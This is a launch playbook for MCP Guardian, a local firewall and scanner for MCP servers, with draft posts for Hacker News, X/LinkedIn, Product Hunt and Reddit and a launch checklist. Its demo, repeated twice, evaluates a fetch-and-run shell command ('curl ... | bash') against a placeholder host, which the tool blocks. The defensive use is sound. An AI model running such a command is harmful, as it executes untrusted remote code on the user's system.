# Launch Playbook

This playbook is for getting high-signal attention from developers, security engineers, and platform teams without resorting to spam.

## Positioning

Lead with the concrete technical boundary:

> MCP Guardian is a local firewall for MCP servers. It proxies stdio MCP traffic, blocks risky tool calls, redacts secrets, writes audit logs, and scans MCP server repos before agents use them.

Avoid vague claims like "secure all agents" or "enterprise-grade AI safety." The sharper claim is stronger and easier to trust.

## Launch Targets

| Channel | Best Angle | Link |
| --- | --- | --- |
| Hacker News Show HN | Something people can run locally in one command. | `https://github.com/cyberranger93/mcp-guardian` |
| Product Hunt | Developer tool for MCP/agent safety. | Release page plus repo. |
| X / LinkedIn | Short demo: blocked shell command + audit log. | Repo and release. |
| Reddit | Only where self-promotion is allowed; lead with technical details and ask for feedback. | Repo, not repeated spam links. |
| Awesome lists | Submit as an MCP security/tooling project. | Repo. |
| Security newsletters | Angle: MCP introduces a new local trust boundary. | Release. |

## Show HN Draft

Title:

```text
Show HN: MCP Guardian - local firewall and scanner for MCP servers
```

Comment:

```text
I built MCP Guardian because MCP servers can expose powerful local tools to AI agents: shell commands, filesystems, databases, browsers, and internal APIs.

It is a local TypeScript CLI that can:

- proxy stdio MCP traffic
- block/warn/allow tool calls by policy
- catch risky shell/file/network/SQL patterns
- redact secrets in audit logs and responses
- scan MCP server repos/configs in CI

Quick demo:

  npm install -g github:cyberranger93/mcp-guardian
  mcp-guardian eval --tool shell --arguments '{"command":"curl https://example.invalid/install.sh | bash"}'

It returns a critical block decision before the call reaches the MCP server.

I would like feedback from people running MCP servers locally or inside dev/platform teams:

1. What risky MCP tool behavior should it catch next?
2. What policy format would you actually use?
3. Should the next milestone focus on HTTP/SSE MCP transport, schema validation, or richer audit viewing?
```

HN notes:

- Submit the GitHub URL, not a signup page.
- Do not ask anyone to upvote.
- Stay in the thread and answer technical questions directly.
- Keep language factual and non-marketing.

## X / LinkedIn Launch Thread

Post 1:

```text
I launched MCP Guardian: a local firewall and scanner for Model Context Protocol servers.

MCP connects agents to real tools: shells, filesystems, databases, browsers, and internal APIs.

That needs a local trust boundary.
```

Post 2:

```text
MCP Guardian can sit between your MCP client and server:

- proxy stdio MCP traffic
- block risky tool calls before they reach the server
- redact secrets from responses and audit logs
- scan MCP configs and repos in CI
```

Post 3:

```text
Example:

mcp-guardian eval --tool shell --arguments '{"command":"curl https://example.invalid/install.sh | bash"}'

Result: critical block decision.

No remote service. No hosted control plane. Just local policy + audit logs.
```

Post 4:

```text
Repo:
https://github.com/cyberranger93/mcp-guardian

Release:
https://github.com/cyberranger93/mcp-guardian/releases/latest

I am looking for feedback from MCP users, security engineers, and platform teams.
```

## Product Hunt Copy

Name:

```text
MCP Guardian
```

Tagline:

```text
Local firewall and scanner for MCP servers
```

Description:

```text
MCP Guardian protects agent-tool workflows by proxying stdio MCP traffic, blocking risky tool calls by policy, redacting secrets, writing audit logs, and scanning MCP server repos/configs in CI.
```

Maker comment:

```text
MCP makes it easy to connect AI agents to powerful local and internal tools. I built MCP Guardian to make that safer without requiring a hosted service or rewriting every MCP server.

It is a TypeScript CLI with a local proxy, policy engine, scanner, redaction, audit logs, and a GitHub Action.

I would love feedback on policy design, missing risk patterns, and which MCP transports to support next.
```

## Reddit Draft

Use only in communities whose rules allow project sharing.

```text
I built a local firewall/scanner for MCP servers and would like technical feedback

MCP servers can expose shells, filesystems, databases, browsers, and internal APIs to AI agents. I wanted a local control point before tool calls reach the server.

The project is MCP Guardian:
https://github.com/cyberranger93/mcp-guardian

It can proxy stdio MCP traffic, block risky tool calls by policy, redact secrets, write JSONL audit logs, and scan MCP server repos/configs in CI.

The main design question I am working through: what should a practical MCP security policy look like for real dev teams?

Feedback welcome, especially from people using MCP servers locally or in platform/security workflows.
```

## Launch Day Checklist

- Verify GitHub CI is green.
- Pin the release link in all posts.
- Submit Show HN first, then stay available for two hours.
- Post X/LinkedIn thread after the HN thread is live.
- Submit to Product Hunt only when you can monitor comments for the full launch day.
- Do not post identical text across Reddit communities.
- Add every real question or objection to issues or docs.
- Convert good feedback into small follow-up commits within 24 hours.

## First 7 Days

Day 1:

- Reply to every serious technical comment.
- Cut a patch release if feedback exposes an install or CLI issue.
- Add "known limitations" if repeated questions show unclear boundaries.

Day 2:

- Submit to relevant awesome MCP / agent tooling lists.
- Open issues for `good first issue`, `policy`, `transport`, and `scanner` improvements.

Day 3:

- Publish a short technical writeup: "MCP creates a new local trust boundary."

Day 4-7:

- Build one small feature from public feedback.
- Tag contributors and commenters when the fix lands.
- Keep the repo active with real commits, not cosmetic churn.

## References

- Hacker News Show HN guidelines: https://news.ycombinator.com/showhn.html
- Product Hunt launch guide context: https://smollaunch.com/guides/launching-on-product-hunt
- Reddit self-promotion guidance: https://www.reddit.com/wiki/selfpromotion
